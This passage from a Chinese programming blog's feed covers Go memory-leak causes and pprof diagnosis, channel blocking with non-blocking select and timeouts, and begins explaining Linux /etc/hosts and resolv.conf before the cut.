class="hljs-comment">/**输出</span><br><span class="hljs-comment">=== RUN   TestShortIf</span><br><span class="hljs-comment">10 &gt; 5 : 10</span><br><span class="hljs-comment">10.0 == 10 :  yes</span><br><span class="hljs-comment">&#x27;a&#x27; == &#x27;b&#x27; :  unequal chars</span><br><span class="hljs-comment">--- PASS: TestShortIf (0.00s)</span><br><span class="hljs-comment">PASS</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>golang</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
      <tag>golang</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Golang内存泄露场景与定位方式</title>
    <link href="/2023/06/01/Golang%E5%86%85%E5%AD%98%E6%B3%84%E9%9C%B2%E5%9C%BA%E6%99%AF%E4%B8%8E%E5%AE%9A%E4%BD%8D%E6%96%B9%E5%BC%8F/"/>
    <url>/2023/06/01/Golang%E5%86%85%E5%AD%98%E6%B3%84%E9%9C%B2%E5%9C%BA%E6%99%AF%E4%B8%8E%E5%AE%9A%E4%BD%8D%E6%96%B9%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<h1 id="Golang内存泄露场景与定位方式"><a href="#Golang内存泄露场景与定位方式" class="headerlink" title="Golang内存泄露场景与定位方式"></a>Golang内存泄露场景与定位方式</h1><h2 id="一、产生原因"><a href="#一、产生原因" class="headerlink" title="一、产生原因"></a>一、产生原因</h2><p>Golang有自动垃圾回收机制，但是仍然可能会出现内存泄漏的情况。以下是Golang内存泄漏的常见可能原因：</p><ol><li><strong>循环引用</strong>：如果两个或多个对象相互引用，且没有其他对象引用它们，那么它们就会被垃圾回收机制误认为是仍在使用的对象，导致内存泄漏。</li><li><strong>全局变量</strong>：在Golang中，全局变量的生命周期与程序的生命周期相同。如果一个全局变量被创建后一直存在于内存中，那么它所占用的内存就无法被回收，可能会导致内存泄漏。</li><li><strong>未关闭的文件句柄</strong>：如果程序打开了文件句柄但没有关闭它们，那么这些文件句柄所占用的内存就无法被回收，可能会导致内存泄漏。</li><li><strong>大量的临时对象</strong>：如果程序创建了大量的临时对象，但没有及时释放它们，那么这些对象所占用的内存就无法被回收，可能会导致内存泄漏。</li><li><strong>goroutine泄漏</strong>：<strong>常见的泄露场景</strong>，例如协程发生阻塞，Go运行时并不会将处于永久阻塞状态的协程杀掉，因此永久处于阻塞状态的协程所占用的资源将永得不到释放。</li><li><strong>time.Ticker未关闭导致泄漏</strong>：当一个<code>time.Timer</code>值不再被使用，一段时间后它将被自动垃圾回收掉。 但对于一个不再使用的<code>time.Ticker</code>值，我们必须调用它的<code>Stop</code>方法结束它，否则它将永远不会得到回收。</li></ol><h2 id="二、排查方式"><a href="#二、排查方式" class="headerlink" title="二、排查方式"></a>二、排查方式</h2><p>如果出现内存泄漏，可以使用以下方式进行分析，找出内存泄漏的原因并进行修复。</p><ol><li>使用 Go 语言自带的 <strong>pprof 工具</strong>进行分析。pprof 可以生成程序的 CPU 和内存使用情况的报告，帮助开发者找出程序中的性能瓶颈和内存泄漏问题。可以通过在代码中添加 <code>import _ &quot;net/http/pprof&quot;</code> 和 <code>http.ListenAndServe(&quot;localhost:6060&quot;, nil)</code> 来开启 pprof 工具。</li><li>使用 Golang 内置的 <code>runtime</code> 包进行分析。<code>runtime</code> 包提供了一些函数，包括 <code>SetFinalizer</code>、<code>ReadMemStats</code> 和 <code>Stack</code> 等，可以帮助开发者了解程序的内存使用情况和内存泄漏问题。</li><li>使用第三方工具进行分析。例如，可以使用 <code>go-torch</code> 工具生成火焰图，帮助开发者找出程序中的性能瓶颈和内存泄漏问题。</li><li>使用 <code>go vet</code> 工具进行静态分析。<code>go vet</code> 可以检查程序中的常见错误和潜在问题，包括内存泄漏问题。</li><li>代码审查。开发者可以通过代码审查来找出程序中的潜在问题和内存泄漏问题。</li></ol><h2 id="三、通过-pprof-的命令排查内存泄露问题"><a href="#三、通过-pprof-的命令排查内存泄露问题" class="headerlink" title="三、通过 pprof 的命令排查内存泄露问题"></a>三、通过 pprof 的命令排查内存泄露问题</h2><h3 id="3-1-通过-pprof-的命令行分析-heap"><a href="#3-1-通过-pprof-的命令行分析-heap" class="headerlink" title="3.1 通过 pprof 的命令行分析 heap"></a>3.1 通过 pprof 的命令行分析 heap</h3><p>命令行执行命令: <code>go tool pprof -inuse_space [&lt;http://127.0.0.1:9999/debug/pprof/heap&gt;](&lt;http://spark-master.x.upyun.com/debug/pprof/heap&gt;)</code></p><p>这个命令的作用是, 抓取当前程序已使用的 heap. 抓取后, 就可以进行类似于 gdb 的交互操作.</p><ul><li>top 命令, 默认能列出当前程序中内存占用排名前 10 的函数. 如图. 当时进行到这一步的时候, 我就非常惊讶, 因为 <code>time.NewTimer</code> 居然占据了 6 个多 G 的内存.</li></ul><p><img src="https://pic4.zhimg.com/80/v2-2ef735b81234db0c7ba6c567135f123b_1440w.webp" alt="img"></p><ul><li><code>list &lt;函数名&gt;</code>, 展现函数内部的内存占用. 使用 <code>list time.NewTimer</code> 查看了该函数的内部, 真相大白了, 原来每次调用 <code>NewTimer</code> 都会创建一个 channel, 还会生成一个结构体 <code>runtimeTimer</code>, 应该就是这两个地方内存没有释放造成的内存泄露.</li></ul><p><img src="https://pic2.zhimg.com/80/v2-16566847f6c80be09bd30ef5586b2915_1440w.webp" alt="img"></p><h3 id="3-2-修改-for-select-time-After-造成的内存泄露"><a href="#3-2-修改-for-select-time-After-造成的内存泄露" class="headerlink" title="3.2 修改 for ... select ... time.After 造成的内存泄露"></a>3.2 <strong>修改 <code>for ... select ... time.After</code> 造成的内存泄露</strong></h3><p>原来程序中存在如下代码:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">for</span> &#123;<br><span class="hljs-keyword">select</span> &#123;<br><br><span class="hljs-keyword">case</span> a := &lt;-chanA:<br>...<br><br><span class="hljs-keyword">case</span> b := &lt;-chanB:<br>....<br><br><span class="hljs-keyword">case</span> &lt;-time.After(<span class="hljs-number">20</span>*time.Minutes):<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, errors.New(<span class="hljs-string">&quot;download timeout&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p><code>time.After</code> 就是封装了一层的 <code>NewTimer</code>, <code>time.After</code> 的源码:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">After</span><span class="hljs-params">(d Duration)</span></span> &lt;-<span class="hljs-keyword">chan</span> Time &#123;<br><span class="hljs-keyword">return</span> NewTimer(d).C<br>&#125;<br></code></pre></td></tr></table></figure><p>修复该错误, 只调用一次 <code>NewTimer</code>:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs go">downloadTimeout := time.NewTimer(<span class="hljs-number">20</span> * time.Minute)<br><span class="hljs-comment">// 添加关闭时退出操作</span><br><span class="hljs-keyword">defer</span> downloadTimeout.Stop()<br><br><span class="hljs-keyword">for</span> &#123;<br><span class="hljs-keyword">select</span> &#123;<br><br><span class="hljs-keyword">case</span> a := &lt;-chanA:<br>...<br><br><span class="hljs-keyword">case</span> b := &lt;-chanB:<br>....<br><br><span class="hljs-keyword">case</span> &lt;-downloadTimeout.C:<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, errors.New(<span class="hljs-string">&quot;download timeout&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h2><p>通过这篇文章我们了解到Golang内存泄漏的常见可能原因有哪些：</p><ol><li><strong>循环引用</strong>：如果两个或多个对象相互引用，且没有其他对象引用它们，那么它们就会被垃圾回收机制误认为是仍在使用的对象，导致内存泄漏。</li><li><strong>全局变量</strong>：在Golang中，全局变量的生命周期与程序的生命周期相同。如果一个全局变量被创建后一直存在于内存中，那么它所占用的内存就无法被回收，可能会导致内存泄漏。</li><li><strong>未关闭的文件句柄</strong>：如果程序打开了文件句柄但没有关闭它们，那么这些文件句柄所占用的内存就无法被回收，可能会导致内存泄漏。</li><li><strong>大量的临时对象</strong>：如果程序创建了大量的临时对象，但没有及时释放它们，那么这些对象所占用的内存就无法被回收，可能会导致内存泄漏。</li><li><strong>goroutine泄漏</strong>：比较常见的泄露场景，例如协程发生阻塞，Go运行时并不会将处于永久阻塞状态的协程杀掉，因此永久处于阻塞状态的协程所占用的资源将永得不到释放。</li><li><strong>time.Ticker未关闭导致泄漏</strong>：当一个<code>time.Timer</code>值不再被使用，一段时间后它将被自动垃圾回收掉。 但对于一个不再使用的<code>time.Ticker</code>值，我们必须调用它的<code>Stop</code>方法结束它，否则它将永远不会得到回收。</li></ol><p>然后介绍了相关排查工具以及pprof如何排查内存泄露问题。</p><h2 id="五、参考链接"><a href="#五、参考链接" class="headerlink" title="五、参考链接"></a>五、参考链接</h2><p>1.<a href="https://gfw.go101.org/article/memory-leaking.html">一些可能的内存泄漏场景</a></p><p>2.<a href="https://zhuanlan.zhihu.com/p/265080950">使用 pprof 排查 Golang 内存泄露</a></p>]]></content>
    
    
    <categories>
      
      <category>golang</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>golang</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Golang通道阻塞情况与通道无阻塞实现</title>
    <link href="/2023/05/30/Golang%E9%80%9A%E9%81%93%E9%98%BB%E5%A1%9E%E6%83%85%E5%86%B5%E4%B8%8E%E9%80%9A%E9%81%93%E6%97%A0%E9%98%BB%E5%A1%9E%E5%AE%9E%E7%8E%B0/"/>
    <url>/2023/05/30/Golang%E9%80%9A%E9%81%93%E9%98%BB%E5%A1%9E%E6%83%85%E5%86%B5%E4%B8%8E%E9%80%9A%E9%81%93%E6%97%A0%E9%98%BB%E5%A1%9E%E5%AE%9E%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="Golang通道阻塞情况与通道无阻塞实现"><a href="#Golang通道阻塞情况与通道无阻塞实现" class="headerlink" title="Golang通道阻塞情况与通道无阻塞实现"></a>Golang通道阻塞情况与通道无阻塞实现</h1><h2 id="一、通道阻塞原理"><a href="#一、通道阻塞原理" class="headerlink" title="一、通道阻塞原理"></a>一、通道阻塞原理</h2><p>在Go语言中，通道会在以下情况下发生阻塞：</p><ol><li>如果通道已满，并且没有协程在读取通道中的数据，那么任何试图将数据写入通道的协程都会被阻塞，直到有空间可用为止。</li><li>如果通道为空，并且没有协程在等待从通道中读取数据，那么任何试图从通道中读取数据的协程都会被阻塞，直到有数据可用为止。</li></ol><h2 id="二、通道阻塞场景"><a href="#二、通道阻塞场景" class="headerlink" title="二、通道阻塞场景"></a>二、通道阻塞场景</h2><p>在channel中，<strong>无论是有缓存通道、无缓冲通道都存在阻塞的情况</strong>。阻塞场景共4个，有缓存和无缓冲各2个。</p><h3 id="2-1-无缓冲通道"><a href="#2-1-无缓冲通道" class="headerlink" title="2.1 无缓冲通道"></a>2.1 无缓冲通道</h3><p><strong>无缓冲通道</strong>的特点是，发送的数据需要被读取后，发送才会完成，它<strong>阻塞场景</strong>：</p><ol><li>通道中无数据，但执行读通道。</li><li>通道中无数据，向通道写数据，但无协程读取。</li></ol><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// 场景1</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ReadNoDataFromNoBufCh</span><span class="hljs-params">()</span></span> &#123;<br>    noBufCh := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>)<br><br>    &lt;-noBufCh<br>    fmt.Println(<span class="hljs-string">&quot;read from no buffer channel success&quot;</span>)<br><br>    <span class="hljs-comment">// Output:</span><br>    <span class="hljs-comment">// fatal error: all goroutines are asleep - deadlock!</span><br>&#125;<br><br><span class="hljs-comment">// 场景2</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">WriteNoBufCh</span><span class="hljs-params">()</span></span> &#123;<br>    ch := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>)<br><br>    ch &lt;- <span class="hljs-number">1</span><br>    fmt.Println(<span class="hljs-string">&quot;write success no block&quot;</span>)<br>    <br>    <span class="hljs-comment">// Output:</span><br>    <span class="hljs-comment">// fatal error: all goroutines are asleep - deadlock!</span><br>&#125;<br></code></pre></td></tr></table></figure><p><em>注：示例代码中的Output注释代表函数的执行结果</em></p><p>每一个函数都由于阻塞在通道操作而无法继续向下执行，最后报了死锁错误。</p><h3 id="2-2-有缓存通道"><a href="#2-2-有缓存通道" class="headerlink" title="2.2 有缓存通道"></a>2.2 有缓存通道</h3><p><strong>有缓存通道</strong>的特点是，有缓存时可以向通道中写入数据后直接返回，缓存中有数据时可以从通道中读到数据直接返回，这时有缓存通道是不会阻塞的，它<strong>阻塞场景是</strong>：</p><ol><li>通道的缓存无数据，但执行读通道。</li><li>通道的缓存已经占满，向通道写数据，但无协程读。</li></ol><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// 场景1</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ReadNoDataFromBufCh</span><span class="hljs-params">()</span></span> &#123;<br>    bufCh := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>, <span class="hljs-number">1</span>)<br><br>    &lt;-bufCh<br>    fmt.Println(<span class="hljs-string">&quot;read from no buffer channel success&quot;</span>)<br><br>    <span class="hljs-comment">// Output:</span><br>    <span class="hljs-comment">// fatal error: all goroutines are asleep - deadlock!</span><br>&#125;<br><br><span class="hljs-comment">// 场景2</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">WriteBufChButFull</span><span class="hljs-params">()</span></span> &#123;<br>    ch := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>, <span class="hljs-number">1</span>)<br>    <span class="hljs-comment">// make ch full</span><br>    ch &lt;- <span class="hljs-number">100</span><br><br>    ch &lt;- <span class="hljs-number">1</span><br>    fmt.Println(<span class="hljs-string">&quot;write success no block&quot;</span>)<br>    <br>    <span class="hljs-comment">// Output:</span><br>    <span class="hljs-comment">// fatal error: all goroutines are asleep - deadlock!</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="三、通道无阻塞读写"><a href="#三、通道无阻塞读写" class="headerlink" title="三、通道无阻塞读写"></a>三、通道无阻塞读写</h2><h3 id="3-1-Select实现无阻塞读写"><a href="#3-1-Select实现无阻塞读写" class="headerlink" title="3.1 Select实现无阻塞读写"></a>3.1 Select实现无阻塞读写</h3><p>下面<strong>示例代码是使用select修改后的无缓冲通道和有缓冲通道的读写</strong>，以下函数可以直接通过main函数调用；</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// 1.select结构实现通道读</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ReadWithSelect</span><span class="hljs-params">(ch <span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>)</span></span> (x <span class="hljs-type">int</span>, err <span class="hljs-type">error</span>) &#123;<br>    <span class="hljs-keyword">select</span> &#123;<br>    <span class="hljs-keyword">case</span> x = &lt;-ch:<br>        <span class="hljs-keyword">return</span> x, <span class="hljs-literal">nil</span><br>    <span class="hljs-keyword">default</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>, errors.New(<span class="hljs-string">&quot;channel has no data&quot;</span>)<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 无缓冲通道读</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ReadNoDataFromNoBufChWithSelect</span><span class="hljs-params">()</span></span> &#123;<br>    bufCh := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>)<br><br>    <span class="hljs-keyword">if</span> v, err := ReadWithSelect(bufCh); err != <span class="hljs-literal">nil</span> &#123;<br>        fmt.Println(err)<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        fmt.Printf(<span class="hljs-string">&quot;read: %d\n&quot;</span>, v)<br>    &#125;<br><br>    <span class="hljs-comment">// Output:</span><br>    <span class="hljs-comment">// channel has no data</span><br>&#125;<br><br><span class="hljs-comment">// 有缓冲通道读</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ReadNoDataFromBufChWithSelect</span><span class="hljs-params">()</span></span> &#123;<br>    bufCh := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>, <span class="hljs-number">1</span>)<br><br>    <span class="hljs-keyword">if</span> v, err := ReadWithSelect(bufCh); err != <span class="hljs-literal">nil</span> &#123;<br>        fmt.Println(err)<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        fmt.Printf(<span class="hljs-string">&quot;read: %d\n&quot;</span>, v)<br>    &#125;<br><br>    <span class="hljs-comment">// Output:</span><br>    <span class="hljs-comment">// channel has no data</span><br>&#125;<br><br><span class="hljs-comment">// 2. select结构实现通道写</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">WriteChWithSelect</span><span class="hljs-params">(ch <span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>)</span></span> <span class="hljs-type">error</span> &#123;<br>    <span class="hljs-keyword">select</span> &#123;<br>    <span class="hljs-keyword">case</span> ch &lt;- <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>    <span class="hljs-keyword">default</span>:<br>        <span class="hljs-keyword">return</span> errors.New(<span class="hljs-string">&quot;channel blocked, can not write&quot;</span>)<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 无缓冲通道写</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">WriteNoBufChWithSelect</span><span class="hljs-params">()</span></span> &#123;<br>    ch := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>)<br>    <span class="hljs-keyword">if</span> err := WriteChWithSelect(ch); err != <span class="hljs-literal">nil</span> &#123;<br>        fmt.Println(err)<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        fmt.Println(<span class="hljs-string">&quot;write success&quot;</span>)<br>    &#125;<br><br>    <span class="hljs-comment">// Output:</span><br>    <span class="hljs-comment">// channel blocked, can not write</span><br>&#125;<br><br><span class="hljs-comment">// 有缓冲通道写</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">WriteBufChButFullWithSelect</span><span class="hljs-params">()</span></span> &#123;<br>    ch := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>, <span class="hljs-number">1</span>)<br>    <span class="hljs-comment">// make ch full</span><br>    ch &lt;- <span class="hljs-number">100</span><br>    <span class="hljs-keyword">if</span> err := WriteChWithSelect(ch); err != <span class="hljs-literal">nil</span> &#123;<br>        fmt.Println(err)<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        fmt.Println(<span class="hljs-string">&quot;write success&quot;</span>)<br>    &#125;<br><br>    <span class="hljs-comment">// Output:</span><br>    <span class="hljs-comment">// channel blocked, can not write</span><br>&#125;<br></code></pre></td></tr></table></figure><p><em>注：示例代码中的Output注释代表函数的执行结果</em></p><p>从结果能看出，在通道不可读或者不可写的时候，不再阻塞等待，而是直接返回。</p><h3 id="3-2-使用Select-超时改善无阻塞读写"><a href="#3-2-使用Select-超时改善无阻塞读写" class="headerlink" title="3.2 使用Select+超时改善无阻塞读写"></a>3.2 使用Select+超时改善无阻塞读写</h3><p><strong>使用default实现的无阻塞通道阻塞有一个缺陷：当通道不可读或写的时候，会即可返回</strong>。实际场景，更多的需求是，我们希望尝试读一会数据，或者尝试写一会数据，如果实在没法读写再返回，程序继续做其它的事情。</p><p><strong>使用定时器替代default</strong>可以解决这个问题，<strong>给通道增加读写数据的容忍时间</strong>，如果500ms内无法读写，就即刻返回。示例代码修改一下会是这样：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ReadWithSelect</span><span class="hljs-params">(ch <span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>)</span></span> (x <span class="hljs-type">int</span>, err <span class="hljs-type">error</span>) &#123;<br>    timeout := time.NewTimer(time.Microsecond * <span class="hljs-number">500</span>)<br><br>    <span class="hljs-keyword">select</span> &#123;<br>    <span class="hljs-keyword">case</span> x = &lt;-ch:<br>        <span class="hljs-keyword">return</span> x, <span class="hljs-literal">nil</span><br>    <span class="hljs-keyword">case</span> &lt;-timeout.C:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>, errors.New(<span class="hljs-string">&quot;read time out&quot;</span>)<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">WriteChWithSelect</span><span class="hljs-params">(ch <span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>)</span></span> <span class="hljs-type">error</span> &#123;<br>    timeout := time.NewTimer(time.Microsecond * <span class="hljs-number">500</span>)<br><br>    <span class="hljs-keyword">select</span> &#123;<br>    <span class="hljs-keyword">case</span> ch &lt;- <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>    <span class="hljs-keyword">case</span> &lt;-timeout.C:<br>        <span class="hljs-keyword">return</span> errors.New(<span class="hljs-string">&quot;write time out&quot;</span>)<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>结果就会变成超时返回：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">read time out<br>write time out<br>read time out<br>write time out<br></code></pre></td></tr></table></figure><h2 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h2><p>本篇文章介绍了在Go语言中，通道会在以下情况下发生阻塞：</p><ol><li>如果通道已满，并且没有协程在读取通道中的数据，那么任何试图将数据写入通道的协程都会被阻塞，直到有空间可用为止。</li><li>如果通道为空，并且没有协程在等待从通道中读取数据，那么任何试图从通道中读取数据的协程都会被阻塞，直到有数据可用为止。</li></ol><p>以及解决阻塞的2种办法：</p><ol><li>使用select的default语句，在channel不可读写时，即可返回</li><li>使用select+定时器，在超时时间内，channel不可读写，则返回</li></ol><h2 id="五、参考链接"><a href="#五、参考链接" class="headerlink" title="五、参考链接"></a>五、参考链接</h2><ol><li><a href="https://link.segmentfault.com/?enc=I8bBYkFvu/rXuHxcGZ0Hzg==.cLfDBqOXcGkKHQP6HNyDPb3gkSx3iH9/T4kLKXRpQVI=">大彬</a>，<a href="http://lessisbetter.site/2018/11/03/Golang-channel-read-and-write-without-blocking/">http://lessisbetter.site/2018/11/03/Golang-channel-read-and-write-without-blocking/</a></li><li><a href="https://studygolang.com/articles/6024">https://studygolang.com/articles/6024</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>golang</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>golang</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>linux中etc目录下hosts与resolv.conf文件作用</title>
    <link href="/2023/05/11/linux%E4%B8%ADetc%E7%9B%AE%E5%BD%95%E4%B8%8Bhosts%E4%B8%8Eresolv-conf%E6%96%87%E4%BB%B6%E4%BD%9C%E7%94%A8/"/>
    <url>/2023/05/11/linux%E4%B8%ADetc%E7%9B%AE%E5%BD%95%E4%B8%8Bhosts%E4%B8%8Eresolv-conf%E6%96%87%E4%BB%B6%E4%BD%9C%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="linux中etc目录下hosts与resolv-conf文件作用"><a href="#linux中etc目录下hosts与resolv-conf文件作用" class="headerlink" title="linux中etc目录下hosts与resolv.conf文件作用"></a>linux中etc目录下hosts与resolv.conf文件作用</h1><h2 id="一、-x2F-etc-x2F-hosts"><a href="#一、-x2F-etc-x2F-hosts" class="headerlink" title="一、&#x2F;etc&#x2F;hosts"></a>一、&#x2F;etc&#x2F;hosts</h2><p>文件则是一个本地的域名解析文件，它可以用来手动指定域名和IP地址的对应关系。<strong>当操作系统在DNS服务器中无法找到域名对应的IP地址时，它会查看<code>/etc/hosts</code>文件</strong>，以查找是否有手动指定的对应关系。这个文件通常用于在本地测试和开发环境中，或者是在不想使用DNS服务器的情况下手动指定域名和IP地址的对应关系。</p><p>hosts文件包含了IP地址和主机名之间的映射，还包括主机名的别名。在没有域名服务器的情况下，系统上的所有网络程序都通过查询该文件来解析对应于某个主机名的IP地址，否则就需要使用DNS服务程序来解决。通常可以将常用的域名和IP地址映射加入到hosts文件中，实现快速方便的访问。</p><p><strong>hosts格式：IP地址   主机名&#x2F;域名，也可以是：IP地址   主机名&#x2F;服务名</strong></p><p><strong>示例如下：</strong> </p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">192.168.1.1</span> localhost.localdomain localhost<br><span class="hljs-number">192.168.1.2</span> worker02  //主机名<br><span class="hljs-number">192.168.1.2</span> nginx  //服务名<br></code></pre></td></tr></table></figure><h2 id="二、-x2F-etc-x2F-resolv-conf"><a href="#二、-x2F-etc-x2F-resolv-conf" class="headerlink" title="二、&#x2F;etc&#x2F;resolv.conf"></a>二、&#x2F;etc&#x2F;resolv.conf</h2><p>文件包含了DNS（Domain Name 